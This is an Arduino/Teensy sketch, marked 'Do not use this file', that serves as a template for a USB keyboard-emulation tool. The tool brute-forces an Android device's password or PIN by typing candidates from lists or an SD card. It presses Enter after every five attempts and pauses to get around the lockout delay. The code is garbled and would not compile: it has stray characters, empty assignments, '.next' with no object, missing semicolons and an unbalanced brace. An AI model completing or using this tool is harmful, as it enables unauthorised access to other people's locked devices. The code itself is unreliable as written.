/* Do not use this file !!! */

// First remove *leonardo.ino if you're using a Teensy 3/3++ or remove *teensy3.ino if you're using an Arduino Leonardo

//If you're not using LCD screen, remove lcd*.ino
//If you're using a classic LCD screen keep ????.ino and specify pin below
lcdPins = 0;

//If you're using a LCD16x2 import LCD16x2.h from https://www.olimex.com/Products/Duino/Shields/SHIELD-LCD16x2/
//And keep lcd162-leonardo.ino


/*
//If you're not using LCD screen, remove the line below
//If you're using LCD screen remove the line depending of which LCD you're using

//Standart LCD
#include <LiquidCrystal.h>

//Need LCD16x2.h from https://www.olimex.com/Products/Duino/Shields/SHIELD-LCD16x2/
#include <LCD16x2.h>
#include <Wire.h>
*/

//SDLeonardo
//If you're not using SD card specify it below and remove *SD*.ino, you can also remove SdPins var.
boolean UsingSdCard = true;a

//If you're using a SD card reader on Teensy specify pin below
SdPins = 


//If you're bruteforcing a PIN you can remove the lines below and specify it at the end
//NO SD Card : you specify one or more login and password
//SD Card : you specify one or more file location for login and password
const char *login[] = {""}
const char *password[] = {""}

boolean bruteForcingPin = false;
int bruteForceMinLength = 4;
int bruteFroceMaxLength = 16;

void setup(){
  attempt = 0;
}

void loop(){
  testedLogin = .next
  testPassword = .next
 
 //here you put the action for example, attacking Android password
        typePassword(testPassword);
        typeSpecial(ENTER);
        attempt ++;
        if (attempt == 5)
        {
          //Type enter to close warning box
          delay(200);
          enterKey();
          
          //Type enter every 5 second to keep android alive
          for (keepalive = 0 ; keepalive < 30 ; keepalive++)
          {
            delay(1000);
            enterKey();  
          }
     
          //wait more
          delay(100);
          enterKey();
          attempt = 0;
        }
      }
}
